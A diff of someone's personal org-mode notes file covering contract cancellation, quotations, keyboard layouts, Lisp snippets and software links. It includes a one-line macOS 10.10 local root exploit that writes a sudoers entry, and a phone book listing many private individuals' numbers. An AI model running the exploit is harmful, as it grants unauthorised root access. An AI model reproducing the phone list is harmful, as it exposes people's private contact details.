+  08, et comportant l’identifiant de résiliation disponible dans
+  l’espace abonné afin d’identifier et d’authentifier les demandes de
+  résiliations,
+
+
+Deux cas de figure se présentent lors de votre résiliation (cliquez sur votre souhait) :
+
+Vous souhaitez conserver votre numéro de téléphone chez votre futur opérateur
+Vous souhaitez résilier votre abonnement sans conservation de votre numéro
+Si vous ne souhaitez pas conserver votre numéro et donc résilier intégralement votre abonnement Free, veuillez nous faire parvenir votre demande de résiliation écrite, par courrier recommandé à l'adresse suivante :
+
+Free Mobile
+Service abonnés
+75371 PARIS Cedex 08
+
+Si vous souhaitez une résiliation immédiate, veuillez l'indiquer dans votre courrier. Sinon, celle-ci aura lieu à la date anniversaire de votre abonnement.
+Une fois la résiliation effectuée, une dernière facture comprenant les consommations du mois précédent peut intervenir.
+Aussi, vos factures restent consultables sur votre Espace Abonné même après résiliation.
+
+*** DONE papiers pole-emploi
+   CLOSED: [2014-08-31 Sun 07:13]
+   - State "DONE"       from "TODO"       [2014-08-31 Sun 07:13]
+*** DONE factures ubudu
+   CLOSED: [2014-08-31 Sun 07:13]
+   - State "DONE"       from "TODO"       [2014-08-31 Sun 07:13]
 
 *** DONE Magnificat
 
@@ -3641,6 +3746,9 @@ http://torrents.thepiratebay.org/5550739/FreeFalcon_5.5.5550739.TPB.torrent
 * SAYINGS, QUOTES
 
 
+DON'T FEED THE TROLL
+http://www.timesonline.co.uk/multimedia/archive/00377/Travel_Silly_Signs__377652a.jpg
+
 
 +---------------
 | BANDEROLES
@@ -3655,12 +3763,81 @@ http://torrents.thepiratebay.org/5550739/FreeFalcon_5.5.5550739.TPB.torrent
 
 bandiera brochure confetti ->  --> banda di conduzione
 
-
+#
 Le maire est un ami de la tienne.
+#
 Ça doit être humiliant pour une femme, d'être mariée à un cocu.
-
-DON'T FEED THE TROLL
-http://www.timesonline.co.uk/multimedia/archive/00377/Travel_Silly_Signs__377652a.jpg
+#
+The important point, and the one vital to constructing bugfree
+programs, is that one wants to think about the control structures
+of a system as control structures, not as individual branch
+statements. This way of thinking is a major step forward.
+    -- The Mythical Man Month
+#
+If I have seen farther than others, it is because I was standing on the
+shoulders of giants.
+     -- Isaac Newton
+#
+In the sciences, we are now uniquely priviledged to sit side by side with
+the giants on whose shoulders we stand.
+     -- Gerald Holton
+#
+If I have not seen as far as others, it is because giants were standing on
+my shoulders.
+     -- Hal Abelson
+#
+Mathematicians stand on each other's shoulders.
+     -- Gauss
+#
+Mathemeticians stand on each other's shoulders while computer scientists
+stand on each other's toes.
+     -- Richard Hamming
+#
+It has been said that physicists stand on one another's shoulders.  If
+this is the case, then programmers stand on one another's toes, and
+software engineers dig each other's graves.
+     -- Unknown
+#
+The  meta-Turing test counts  a thing  as intelligent  if it  seeks to
+devise and apply Turing tests to objects of its own creation.
+     -- Lew Mammel, Jr.
+#
+Capitalization is the difference between "I had to help my uncle Jack
+off a horse." and "I had to help my uncle jack off a horse."
+#
+La vecina se atormenta: se avecina la tormenta. 
+#
+"As memory is becoming cheaper, even microcomputers could be built
+having these primitives, so that the prospect of controlling one's
+kitchen stove with LISP is not so far-fetched." H. Baker, 1977
+* Citations
+#
+Un pays qui se construit un mur dans son millieu, est ce que vous
+imaginez qu'il est possible qu'à un moment où à un autre, il ne se
+prenne pas le mur dans la figure?  -- Marion Sigaut
+#
+This is this inability to fix the building blocks that is one of the
+largest problems that computing has today. -- Alan Kay
+#
+Il y a trois bonnes façons pour se ruiner: - le jeu, les femmes, les
+bureaux d'étude.  J'ai choisi la moins marrante, le bureau d'étude!
+#
+According to Pliny, an artist presented the Roman Emperor Tiberius
+with a cup of glass that wouldn’t break when thrown on the
+ground. When Tiberius asked the artist if anyone else knew of this
+invention and the artist said no, Tiberius killed him—and so began
+the myth of the lost malleable glass.
+#
+Il faut laisser penser que ce que nous faisons est humain.
+Mais en même temps, ça doit être fait pour que les humains vivent mieux.
+Pas simplement pour qu'on les fasse rêver dans un imaginaire impossible.
+-- François Hollande
+---
+We must give the impression that what we do is human.
+At the same time, it must be done so that humans live better.
+Not just to let them dreaming in an impossible imaginary world.
+-- François Hollande
+#
 
 ** Test Driven Development -- Writing Tests
 
@@ -4128,50 +4305,8 @@ Don’t force yourself to test-first every controller, model, and view (my ratio
 +---------------------------------------------------------------------------+
 
 
-#
-The important point, and the one vital to constructing bugfree
-programs, is that one wants to think about the control structures
-of a system as control structures, not as individual branch
-statements. This way of thinking is a major step forward.
-    -- The Mythical Man Month
-#
-If I have seen farther than others, it is because I was standing on the
-shoulders of giants.
-     -- Isaac Newton
-#
-In the sciences, we are now uniquely priviledged to sit side by side with
-the giants on whose shoulders we stand.
-     -- Gerald Holton
-#
-If I have not seen as far as others, it is because giants were standing on
-my shoulders.
-     -- Hal Abelson
-#
-Mathematicians stand on each other's shoulders.
-     -- Gauss
-#
-Mathemeticians stand on each other's shoulders while computer scientists
-stand on each other's toes.
-     -- Richard Hamming
-#
-It has been said that physicists stand on one another's shoulders.  If
-this is the case, then programmers stand on one another's toes, and
-software engineers dig each other's graves.
-     -- Unknown
-#
-The  meta-Turing test counts  a thing  as intelligent  if it  seeks to
-devise and apply Turing tests to objects of its own creation.
-     -- Lew Mammel, Jr.
-#
-Capitalization is the difference between "I had to help my uncle Jack
-off a horse." and "I had to help my uncle jack off a horse."
-#
-La vecina se atormenta: se avecina la tormenta. 
-#
-"As memory is becoming cheaper, even microcomputers could be built
-having these primitives, so that the prospect of controlling one's
-kitchen stove with LISP is not so far-fetched." H. Baker, 1977
-#
+
+
 
 +------------------------------------------------------------------------
 |=========================================================================
@@ -4253,6 +4388,47 @@ box drawing
 
 ==============================================================================
 See dasher below.
+
+** Russian Keyboard
+
+" Ѐ Ё Ђ Ѓ Є Ѕ І Ї Ј Љ Њ Ћ Ќ Ѝ Ў Џ А Б В Г Д Е Ж З И Й К Л М Н О П Р С
+Т У Ф Х Ц Ч Ш Щ Ъ Ы Ь Э Ю Я а б в г д е ж з и й к л м н о п р с т у ф
+х ц ч ш щ ъ ы ь э ю я ѐ ё ђ ѓ є ѕ і ї ј љ њ ћ ќ ѝ ў џ Ѡ ѡ Ѣ ѣ Ѥ ѥ Ѧ ѧ
+Ѩ ѩ Ѫ ѫ Ѭ ѭ Ѯ ѯ Ѱ ѱ Ѳ ѳ Ѵ ѵ Ѷ ѷ Ѹ ѹ Ѻ ѻ Ѽ ѽ Ѿ ѿ Ҁ ҁ ҂ ҃ ҄ ҅ ҆ ҇ ҈ ҉ Ҋ ҋ Ҍ ҍ Ҏ
+ҏ Ґ ґ Ғ ғ Ҕ ҕ Җ җ Ҙ ҙ Қ қ Ҝ ҝ Ҟ ҟ Ҡ ҡ Ң ң Ҥ ҥ Ҧ ҧ Ҩ ҩ Ҫ ҫ Ҭ ҭ Ү ү Ұ ұ
+Ҳ ҳ Ҵ ҵ Ҷ ҷ Ҹ ҹ Һ һ Ҽ ҽ Ҿ ҿ Ӏ Ӂ ӂ Ӄ ӄ Ӆ ӆ Ӈ ӈ Ӊ ӊ Ӌ ӌ Ӎ ӎ ӏ Ӑ ӑ Ӓ ӓ Ӕ
+ӕ Ӗ ӗ Ә ә Ӛ ӛ Ӝ ӝ Ӟ ӟ Ӡ ӡ Ӣ ӣ Ӥ ӥ Ӧ ӧ Ө ө Ӫ ӫ Ӭ ӭ Ӯ ӯ Ӱ ӱ Ӳ ӳ Ӵ ӵ Ӷ ӷ
+Ӹ ӹ Ӻ ӻ Ӽ ӽ Ӿ ӿ Ԁ ԁ Ԃ ԃ Ԅ ԅ Ԇ ԇ Ԉ ԉ Ԋ ԋ Ԍ ԍ Ԏ ԏ Ԑ ԑ Ԓ ԓ Ԕ ԕ Ԗ ԗ Ԙ ԙ Ԛ
+ԛ Ԝ ԝ Ԟ ԟ Ԡ ԡ Ԣ ԣ ᴫ ᵸ ⷠ ⷡ ⷢ ⷣ ⷤ ⷥ ⷦ ⷧ ⷨ ⷩ ⷪ ⷫ ⷬ ⷭ ⷮ ⷯ ⷰ ⷱ ⷲ ⷳ ⷴ ⷵ ⷶ ⷷ
+ⷸ ⷹ ⷺ ⷻ ⷼ ⷽ ⷾ ⷿ Ꙁ ꙁ Ꙃ ꙃ Ꙅ ꙅ Ꙇ ꙇ Ꙉ ꙉ Ꙋ ꙋ Ꙍ ꙍ Ꙏ ꙏ Ꙑ ꙑ Ꙓ ꙓ Ꙕ ꙕ Ꙗ ꙗ Ꙙ ꙙ Ꙛ
+ꙛ Ꙝ ꙝ Ꙟ ꙟ Ꙣ ꙣ Ꙥ ꙥ Ꙧ ꙧ Ꙩ ꙩ Ꙫ ꙫ Ꙭ ꙭ ꙮ ꙯ ꙰ ꙱ ꙲ ꙼ ꙽ ꙾ ꙿ Ꚁ ꚁ Ꚃ ꚃ Ꚅ ꚅ Ꚇ ꚇ Ꚉ
+ꚉ Ꚋ ꚋ Ꚍ ꚍ Ꚏ ꚏ Ꚑ ꚑ Ꚓ ꚓ Ꚕ ꚕ Ꚗ ꚗ "
+
+
+
+russian-computer:
+
+Ё ! " № ; % : ? * ( ) _ + 
+ё 1 2 3 4 5 6 7 8 9 0 - = 
+ Й Ц У К Е Н Г Ш Щ З Х Ъ / 
+ й ц у к е н г ш щ з х ъ \ 
+  Ф Ы В А П Р О Л Д Ж Э 
+  ф ы в а п р о л д ж э 
+   Я Ч С М И Т Ь Б Ю , 
+   я ч с м и т ь б ю . 
+
+russian-typewriter:
+
++ 1 2 3 4 5 6 7 8 9 0 = \ 
+| № - / " : , . _ ? % ! ; 
+ Й Ц У К Е Н Г Ш Щ З Х Ъ ( 
+ й ц у к е н г ш щ з х ъ ) 
+  Ф Ы В А П Р О Л Д Ж Э 
+  ф ы в а п р о л д ж э 
+   Я Ч С М И Т Ь Б Ю Ё 
+   я ч с м и т ь б ю ё 
+
+Я не хочу это видеть．
 
 * ADDRESSES AND PHONE NUMBERS
 
@@ -4360,6 +4536,171 @@ mobile: +46 76 558 7458
 SOS Maman
 BP 70114
 95210 Saint Gracien
+
+** Phone Book
+
+Agathe De Robert|+34679451950
+Alain Bourguignon|+33296703498
+Alain Bourguignon|+33620255649
+Alain Bourguignon|+33661765866
+Alberto Sole|+33961318677
+Alberto Sole|+34661645897
+Alberto Sole|+34961318677
+Alberto Sole|961318677
+Alexander Nazarenko|+3752926322002
+Alexis Bosch|+33652247248
+Alexis Bosch|+33950261348
+Alexis Bosch|+33951870196
+Alexis Bosch|0950261348
+Alexis Bosch|0951870196
+Alexis Delattre|+33699089245
+Alexis de Lattre|+33699089245
+Ali Alsaleh|+966506814613
+Anaïs Nouvet|+336463407101
+André Reinald|+33177695665
+André Reinald|+33652452554
+André Reinald|+33950669403
+André Thieme|+4915117897070
+André Thieme|+491717008954
+Anevia|+33141983240
+Angelo Rossi|+393293516963
+Antoine Engster|+447921801319
+Antoine Engster|00447921801319
+Arnaud Decherf|+33148241482
+Arnaud Decherf|0148241482
+BNP|+33141460409
+BNP|0141460409
+Bastien Guerry|+33666683436
+Bastien Guerry|0666683436
+Benzaquen|+33141927190
+Bernard Bourguignon|+33296701636
+Bettina Barth|+34616439816
+Bnp Issy Ouest|+33141460404
+Bnp Issy Ouest|0141460404
+Brieuc Jeunhomme|+33630768196
+Bruno Bawol|+33602223522
+Bruno Bawol|+33674881116
+Bruno Bawol|0602223522
+Bruno Bawol|0674881116
+Bus ALSA|+34902422242
+Bus ALSA|5567
+Bus Cartagena|+34968505656
+Bus Gg|+34968291911
+Bus Murcia|+34968292211
+Cajamar Tarjeta|+34901511000
+Camille Saubot|+34625983508
+Camille Saubot|+34646240085
+Camille Saubot|+34968556691
+Camille Saubot|0034625983508
+Camille Saubot|0034968556691
+Carlos|+34968337046
+Celestino Conesa|+34968569225
+Chloe Scheuber|0121631587507833050284
+Christiane Chilkowy|+33329665297
+Christiane Chilkowy|+33785017461
+Colin Carr, CSM|9193356889
+Dan Lentz|6092025797
+Dany CHAN|+33633297776
+Dave Azria|+33611080810
+David Boukari|+33661223446
+David Braquart|+33139143477
+De Robert|+34968146250
+Dr Karen Choukroun|+33146422562
+Dr Karen Choukroun|0146422562
+Eric Gharbi|+33658365309
+Eric Gharbi|0658365309
+Erman Kaya|+905413232784
+Famille De Robert|+34968146250
+Fernando Rodriguez|+34610965332
+Florent Xuereb|+33683728168
+Florent Xuereb|0683728168
+Franck Poullain|+33631789378
+François Alter|+33153442252
+François Kruta|+33614519206
+François Kruta|+33659098436
+Frédéric Colomina|+33672569797
+Frédérique Saubot|+33145030179
+Frédérique Saubot|+33145049621
+Frédérique Saubot|+33682948109
+Gabriel De Robert|+34646111756
+Gharbi Eric|+33658365309
+Gharbi Eric|0658365309
+Grégoire Saubot|+33674915872
+Guillaume De Robert|+34626540903
+Guillaume De Robert|+34649357740
+Guillaume De Robert|+34968137376
+Gábor Melis|+36303076507
+Henry Saubot|+33682316575
+Ilker Yenice|+905305172121
+Impot|+33820326326
+Info services|7000
+Info. Internac|11825
+Info. Nacional|11822
+Isabel Aznar Acosta|+34649509902
+JAIME FIOL SANS|+33610799801
+JAIME FIOL SANS|+33669269760
+JAIME FIOL SANS|610799801
+JAIME FIOL SANS|669269760
+Jason Cornez|+34607217161
+Jean-Baptiste Quesney|+33676671665
+Jean-Philippe Capy|+33604016157
+Jean-Philippe Capy|+33950666678
+Jerome Goubier|+971508831129
+Jimmy Nimo|00353000000000
+Jonathan Bouaziz|+33782480616
+Jonathan Bouaziz|0782480616
+Jose Luis Cruz Cañete|+34655666353
+Jose Luis Cruz Cañete|0034655666353
+Jose Manual Urtasun|+34699370494
+Jose Manual Urtasun|+34968563054
+Joseph Reinald|+33613291911
+José Manuel Sánchez Ruiz|+33639650090
+José Manuel Sánchez Ruiz|639650090
+Joëlle Bourguignon|+33672415839
+Levente Mészáros|+36205413889
+Lionel Bringuier|+15032008809
+Lionel Bringuier|+33603611970
+Lionel Thevenard|+33616774371
+Malik Jamali|+33616678471
+Malik Jamali|0616678471
+Mano Sadeghi|+33603234411
+Mano Sadeghi|0603234411
+Mariusz Saramak|+33792016612
+Mariusz Saramak|792016612
+Martin LUTTON|+33175435370
+Martin LUTTON|0175435370
+Martin Lutton|+33678414402
+Martin Lutton|0678414402
+Misha Tavkhelidze|+995599000313
+Mon Compte|963
+Mélanie Rousseau|+33778511321
+Nicoleta Reinald|+33627194908
+Olivier Revon|+33689638439
+Pascal J. Bourguignon|+33623171770
+Pascal J. Bourguignon|+33781556432
+Patricia Guitard|+33663712299
+Patricia Guitard|0663712299
+Patrick MIMOUN|+33760485614
+Patrick MIMOUN|0760485614
+Paul Le Merrer|+33668542601
+Pierpaolo Bernardi|+393924459291
+Pierre-Yves Reynaert|+33619190274
+Ramón Burgueńo|+34676087136
+Recruteur Ios|+33659640699
+Recruteur Ios|0659640699
+Rogelio Serrano|+447624429872
+Répondeur|123
+Slobodan Blazeski|+38971281646
+Séverine Verriez|+33670803977
+Thomas Chauchard|+33619984611
+Thomas Haas|+436641140862
+Thomas M. Hermann|3162850120
+Thomas Saphir|+33616885760
+Tommy Lee Zet|+33604506105
+Tommy Lee Zet|604506105
+Ubudu Project Beacon|+33178090351
+Vicyor Minuesa Cuenca|+34629402487
+Vincente De Robert|+34690010607
 
 * PROVIDERS
 ** eFax
@@ -5051,10 +5392,6 @@ http://www.avglab.com/andrew/webpub/node6.html
 http://www.almossawi.com/firefox/prose/
 http://www.sobbayi.com/blog/software-development/easy-cc-source-code-analysis-visual-cppdepend/
 
-** ANDROID
-
-http://source.android.com/source/downloading.html
-
 ** ANONYMIZERS:
 
     http://anon.inf.tu-dresden.de/index_en.html
@@ -5433,6 +5770,35 @@ Flux OsKit.
   and sophisticated scheduling support, the OSKit also provides a
   nmodular platform for embedded applications, as well as a novel
   component-based approach to constructing entire operating systems.
+
+** Code Snippets
+
+#+BEGIN(src)
+(process-all-files-in-directory
+ "/some/dir/"
+ "\\(\\.some-extension\\)$"
+ "Global Search and Replace"
+ (lambda ()
+   (goto-char (point-min))
+   (while (re-search-forward "some pattern" (point-max) t)
+     (replace-region (match-beginning 0) (match-end 0)
+                     "some replacement")
+     (forward-line))))
+#+END(src)
+
+#+BEGIN(src)
+(let ((*readtable*               vacietis:c-readtable)
+       (vacietis:*compiler-state* (vacietis:make-compiler-state)))
+   (with-open-file (src #P"~/src/lisp/c/duff-device.c")
+     (read src)))
+#+END(src)
+
+#+BEGIN(src)
+(let ((*print-pretty* t)
+      (*print-right-margin* 72))
+  ;; space in ~^ is important to obtain line breaking.
+  (format t "~@<~{~a~^, ~}~:@>" (loop for i below 100 collect i)))
+#+END(src)
 
 ** COMMANDS:
 
@@ -9859,6 +10225,7 @@ pattern matchers
     
 ** LANGUAGES: COMMON LISP: Others
 
+
     Text entry interface
     http://www.inference.phy.cam.ac.uk/dasher/DasherSummary.html
 
@@ -10080,6 +10447,27 @@ You are talking about such tools as gcc-xml and ffigen?
 
 devfs=nomount gentoo=nodevfs
 Bankers's rounding; if it is exactly 0.5  round towards the closest EVEN number.
+
+*** hemlock
+
+<phf> akkad: i have two dwim functions in my config, one is "Indent and Expand" that i
+bind to <tab>. might be handy re "any tab completion for function
+names?". http://paste.lisp.org/display/145376
+   *** gz (sid27187@gateway/web/irccloud.com/x-uctykdnbobrhfamj) has joined channel #ccl
+<phf> i tried adding objective c method completion, but without context analysis it became
+unruly fast
+   *** alms____ (sid27381@gateway/web/irccloud.com/x-lwbkdavcyduuzdee) has joined channel #ccl
+<phf> this document http://common-lisp.net/project/cmucl/doc/hemlock-user.ps.gz is still
+very useful if you're doing basic ide customizations
+<phf> erm, command implementor's manual, rather
+http://common-lisp.net/project/cmucl/doc/hemlock-cim.ps.gz
+
+
+<pjb> studentz: do not use implementation specific packages.  Use (asdf:run-shell-command
+"dot  -Tps -O fname")
+   *** monod (~monod@host52-6-dynamic.40-79-r.retail.telecomitalia.it) has joined channel #lispcafe
+<|3b|> pjb: documentation/comments on that function say not to use it, use
+uiop:run-program instead
 
 ** LANGUAGES: COMMON LISP: PRINT FUNCTIONS
 
@@ -10619,6 +11007,133 @@ http://code.google.com/p/oioic/downloads/list
     Memento pattern
     http://groups.google.com/group/comp.programming/msg/9e7b8aaec1794126
 
+** Open Source Software
+*** Accounting
+http://imperium.edoceo.com/
+http://www.frontaccounting.net/wb3/
+http://www.turbocashuk.com/
+http://xiwa.sourceforge.net/
+*** Audio Recording/Editing
+http://ardour.org/
+http://audacity.sourceforge.net/
+http://frinika.sourceforge.net/
+http://lmms.sourceforge.net/
+http://waveshop.sourceforge.net/
+*** Business Intelligence
+https://community.jaspersoft.com/
+http://www.jedox.com/en/
+http://www.pentaho.com/
+http://www.spagoworld.org/xwiki/bin/view/SpagoBI/
+http://www.knime.org/
+http://openi.org/
+http://www.eclipse.org/birt/
+*** Business Process Management
+http://www.processmaker.com/
+http://www.activiti.org/
+http://www.bonitasoft.com/
+*** CAD
+http://brlcad.org/
+http://www.freecadweb.org/
+http://www.archimedes.org.br/
+*** Customer Relationship Management
+http://www.sugarforge.org/content/open-source/
+http://www.vtiger.com/crm/
+http://orangeleap.com/
+http://sourcetapcrm.sourceforge.net/index.htm
+http://www.splendidcrm.com/Default.aspx
+http://www.concursive.com/show/concoursesuite
+*** Database
+http://www.mysql.com/
+http://www.postgresql.org/
+http://www.firebirdsql.org/
+http://luciddb.sourceforge.net/
+http://www.kexi-project.org/
+*** Desktop Publishing
+http://www.scribus.net/canvas/Scribus
+http://miktex.org/
+*** Development Tools
+http://www.kdevelop.org/
+http://monodevelop.com/
+http://www.icsharpcode.net/OpenSource/SD/
+http://openbd.org/
+*** E-mail/Collaboration/Groupware
+http://www.zimbra.com/products/zimbra-open-source.html
+http://www.egroupware.org/
+http://www.citadel.org/doku.php/start
+*** Enterprise Resource Planning (ERP)
+http://www.openerp.com/
+http://www.openbravo.com/
+http://www.xtuple.com/
+http://www.adempiere.com/index.php/ADempiere
+http://www.compiere.com/
+http://www.opentaps.org/index.php
+http://ofbiz.apache.org/
+http://www.dolibarr.org/
+http://www.weberp.org/
+*** Foreign Language
+http://new.asymptopia.org/staticpages/index.php?page=StepIntoChinese
+http://zwdisplay.sourceforge.net/
+http://zkanji.sourceforge.net/
+*** Gateway Security Appliances
+http://www.endian.com/en/community/overview/
+http://www.untangle.com/
+*** Graphics/Drawing
+http://live.gnome.org/Dia
+http://www.gimp.org/
+http://www.inkscape.org/
+*** Mathematics
+http://www.sagemath.org/tour.html
+http://www.jirka.org/genius.html
+http://www.scilab.org/
+http://maxima.sourceforge.net/
+*** Music
+http://musescore.org/
+*** Office Productivity
+http://www.openoffice.org/
+http://www.libreoffice.org/
+http://www.calligra-suite.org/
+http://www.neooffice.org/neojava/en/index.php
+*** Operating System
+http://www.ubuntu.com/
+http://www.redhat.com/
+http://www.fedoraproject.org/
+https://www.suse.com/
+http://www.opensuse.org/en/
+http://www.linuxmint.com/
+http://www.debian.org/
+*** PDF Tools
+http://www.pdfforge.org/pdfcreator
+http://jpdftweak.sourceforge.net/
+http://pdfedit.cz/en/index.html
+http://pdfedit.cz/en/index.html
+*** Point of Sale (POS)
+http://www.openbravo.com/retailers/product-features/web-point-of-sale/
+http://www.unicenta.com/
+http://floreantpos.org/
+*** Project Management
+http://www.ganttproject.biz/
+http://www.dotproject.net/
+http://www.onepoint-project.com/products/overview?action=setLanguage&language=en
+http://www.openxprocess.com/
+http://www.project-open.com/
+*** Reporting
+http://jmagallanes.sourceforge.net/en/
+*** Screenplay Writing
+http://celtx.com/index.html
+*** Video Tools
+http://www.blender.org/
+http://www.heroinewarrior.com/cinelerra.php
+http://www.openshot.org/
+http://www.kdenlive.org/
+http://avidemux.sourceforge.net/
+http://www.pitivi.org/
+*** Web Site Design
+http://kompozer.net/
+http://bluefish.openoffice.nl/
+http://www.seamonkey-project.org/
+http://bluegriffon.org/
+http://www.w3.org/Amaya/Overview.html
+
 ** PIRATE, BSA
     http://global.bsa.org/france/antipiracy/tools/guidebsa.pdf
 
@@ -10634,6 +11149,16 @@ http://code.google.com/p/oioic/downloads/list
     http://www.gnu.org/philosophy/free-sw.fr.html
     http://www.gnu.org/philosophy/why-free.fr.html
 
+** Project Phases
+
+              Specifications ---------------------------------> acceptance tests 
+                         \                                        /
+                       Analyse ---------------------------> system tests
+                             \                                 / 
+                            Design  -------------------> integration tests
+                                \                           /
+                               Implementation -----> unit tests
+
 ** QuickTime Stream/RealServer
 
     http://service.real.com/help/library/blueprints/datatype/htmfiles/quickti6.htm
@@ -10647,7 +11172,17 @@ http://code.google.com/p/oioic/downloads/list
     http://www.teles-skydsl.fr//?tpl=page/funktion
     Le retour (upload) se fait par ligne RNIS.
 
-** SYSTEMS: BSD
+** SYSTEM: Android
+http://source.android.com/source/downloading.html
+
+*** Text-To-Speech:
+
+If you have an Android phone I recommend installing the Ivona text to
+speech engine with the Amy UK voice and setting that up to work with
+Moon+ Reader Pro, which has the best text to speech support of any of
+the apps I've tried.
+
+** SYSTEM: BSD
     ftp://ftp.FreeBSD.org/pub/FreeBSD/releases/i386/ISO-IMAGES/4.3-install.iso
     ftp://ftp.rediris.es/mirror/OpenBSD/2.9/i386/
 
@@ -10664,28 +11199,28 @@ http://code.google.com/p/oioic/downloads/list
 
     Ouais, je suis d'accord, c'est trop facile, y'a plus de sport.
 
-** SYSTEMS: Darwin
+** SYSTEM: Darwin
 
     sysctl -n hw.memsize
 
     Darwin 7.x == 10.3.x
     Darwin 6.x == 10.2.x
 
-** SYSTEMS: Darwin Macport
+** SYSTEM: Darwin Macport
 
     sudo port selfupdate
     sudo port upgrade outdated
     sudo port uninstall inactive      # remove the inactive ports.
     sudo port clean --all uninstalled # remove the non-installed distfiles
 
-** SYSTEMS: EROS
+** SYSTEM: EROS
 
 http://www.zilium.de/joerg/zeuch/apptest.tar.gz
 http://www.cis.upenn.edu/~shap
 
 http://mumble.net/jar/pubs/secureos/secureos.html   (in lisp)
 
-** SYSTEMS: GNUSTEP
+** SYSTEM: GNUSTEP
 
     http://www.Cenon.info
     http://www.cocoatech.com/opensource
@@ -10848,12 +11383,12 @@ http://mumble.net/jar/pubs/secureos/secureos.html   (in lisp)
 
   http://dmoz.org/ Open Directory Project
 
-** SYSTEMS: Inside Macintosh
+** SYSTEM: Inside Macintosh
 
 http://developer.apple.com/legacy/mac/library/documentation/macos8/mac8.html
 http://www.weihenstephan.org/~michaste/pagetable/mac/Inside_Macintosh.pdf
 
-** SYSTEMS: Linux
+** SYSTEM: Linux
 
     SuSE 7.3 FTP mirror: ftp://ftp.rediris.es/pub/linux/distributions/suse/7.3/
     Linux Security:      http://freshmeat.net/projects/lomac
@@ -10876,7 +11411,7 @@ http://www.weihenstephan.org/~michaste/pagetable/mac/Inside_Macintosh.pdf
         cygwin
         http://www.multimania.com/cdc/backorifice.html
 
-** SYSTEMS: Linux Debian
+** SYSTEM: Linux Debian
 
 http://wiki.debian.org/Multiarch/HOWTO
 
@@ -10924,7 +11459,7 @@ debian versions
 
     update-rc.d
 
-** SYSTEMS: Linux Gentoo
+** SYSTEM: Linux Gentoo
 *** Commands
 
     list installed packages:
@@ -11180,35 +11715,24 @@ dscl . -list /Users
 dscl . -read /Users/pjb
 #-END(src)
 
-*** Licenses
+*** MacOSX 10.10 root exploit:
 
-    From: marc <marc@a9ff.com>
+#+BEGIN(src)
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s # via reddit: numinit (shorter)
+#+END(src)
 
-    3D-Space VFS
-    License name: Pascal Bourguignon
-    License code: LBNL
+*** samba linux -> macosx
 
-    Smart Scroll X
-    License name: Pascal Bourguignon
-    License code: JCKL
+The trick is not to give a path to mount, but the name of a "share":
+mount --verbose -t cifs -o pass=${pass},user=pjb,uid=1000,gid=1000,nounix,sec=ntlmssp,noperm,rw '//larissa/Test' /mnt/p
 
-    Aqua Cmd-Line Tools
-    License name: Pascal Bourguignon
-    License code: SDML
+*** larissa
 
-    A-N-I-M-A-L-S
-    License name: Pascal_Bourguignon
-    License code: JDDP
-    (à utiliser aussi comme login & pwd pour télécharger depuis
-    www.a9ff.com/bin/an/)
+ Remember to set the environment variable GRADLE_HOME to the path to
+ the gradle distribution: /opt/local/share/java/gradle
 
-    Startup Doubler
-    License name: Pascal Bourguignon
-    License code: HDGL
-
-    Smart Scroll
-    License name: Pascal Bourguignon
-    License code: GDAL
+Apple X11.app:    defaults write org.x.X11 enable_test_extensions -boolean true 
+MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true 
 
 *** port
 
@@ -11388,6 +11912,35 @@ if [ -d /opt/database/defaultdb ] ; then
 fi
 ---------------------------------------------------------------------
 
+*** Licenses
+
+    From: marc <marc@a9ff.com>
+
+    3D-Space VFS
+    License name: Pascal Bourguignon
+    License code: LBNL
+
+    Smart Scroll X
+    License name: Pascal Bourguignon
+    License code: JCKL
+
+    Aqua Cmd-Line Tools
+    License name: Pascal Bourguignon
+    License code: SDML
+
+    A-N-I-M-A-L-S
+    License name: Pascal_Bourguignon
+    License code: JDDP
+    (à utiliser aussi comme login & pwd pour télécharger depuis
+    www.a9ff.com/bin/an/)
+
+    Startup Doubler
+    License name: Pascal Bourguignon
+    License code: HDGL
+
+    Smart Scroll
+    License name: Pascal Bourguignon
+    License code: GDAL
 
 ** SYSTEMS: Microsoft Windows
 
@@ -12255,6 +12808,17 @@ Neptune	360.0	283.000	2.1746e-02	117.192	1342.3	301.495	84.98
 Titan	94.0	1.500	5.5026e-03	20.074	194.3	58.887	89.99
 
 * PHYSICS
+** Radiation Belt
+
+Earth radiation = 1e-5 Sievert/day = 4e-7 Sievert/hour
+Fukushima hotest measured          = 2e-5 Sievert/hour
+Moon radiation = 1 Sievert/year    = 1e-4 Sievert/hour
+Van Allen                          = 5e-1 Sievert/hour
+Fukushima inside plant             = 8e0  Sievert/hour
+
+33 hours on Moon surface = 3e-3 Sievert = 
+16 hours in Van Allen    = 8e0  Sievert = 1 hour in Fukushima plant.
+
 ** Matter Energy Information
 
     http://www.gwu.edu/~umpleby/recent_papers/2004_physical_relationships_among_matter_energy_information_umpleby.htm
